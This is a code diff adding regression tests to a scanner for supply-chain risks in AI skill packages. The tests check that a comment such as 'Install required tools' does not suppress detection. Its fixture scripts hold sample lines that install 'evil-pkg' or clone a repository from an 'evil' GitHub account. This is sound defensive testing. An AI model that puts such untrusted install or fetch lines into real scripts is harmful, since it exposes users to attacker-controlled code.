@@ -315,6 +315,42 @@ describe('SUPPLY-003 double context reduction', () => {
   });
 });
 
+// ===== Regression: script comment must not suppress SUPPLY-003/006 =====
+
+describe('Script comment must not be treated as documentation context', () => {
+  it('SUPPLY-003 still fires when script has install comment', () => {
+    const skill = makeSkill('# Minimal skill body for testing purposes.');
+    skill.files.push({
+      path: 'setup.sh',
+      name: 'setup.sh',
+      extension: '.sh',
+      sizeBytes: 100,
+      isBinary: false,
+      content: '#!/bin/bash\n# Install required tools\nnpm install evil-pkg',
+    });
+    const results = supplyChainChecks.run(skill);
+    const s003 = results.filter((r) => r.id === 'SUPPLY-003' && r.source === 'setup.sh');
+    expect(s003.some((r) => r.id === 'SUPPLY-003')).toBe(true);
+    expect(s003[0].severity).toBe('HIGH');
+  });
+
+  it('SUPPLY-006 still fires when script has installation comment', () => {
+    const skill = makeSkill('# Minimal skill body for testing purposes.');
+    skill.files.push({
+      path: 'deploy.sh',
+      name: 'deploy.sh',
+      extension: '.sh',
+      sizeBytes: 100,
+      isBinary: false,
+      content: '#!/bin/bash\n# Installation guide\ngit clone https://github.com/evil/repo.git',
+    });
+    const results = supplyChainChecks.run(skill);
+    const s006 = results.filter((r) => r.id === 'SUPPLY-006' && r.source === 'deploy.sh');
+    expect(s006.some((r) => r.id === 'SUPPLY-006')).toBe(true);
+    expect(s006[0].severity).toBe('MEDIUM');
+  });
+});
+
 // ===== Regression: CODE-001 eval never reduced =====
 
 describe('CODE-001 regression: eval never reduced in code block', () => {
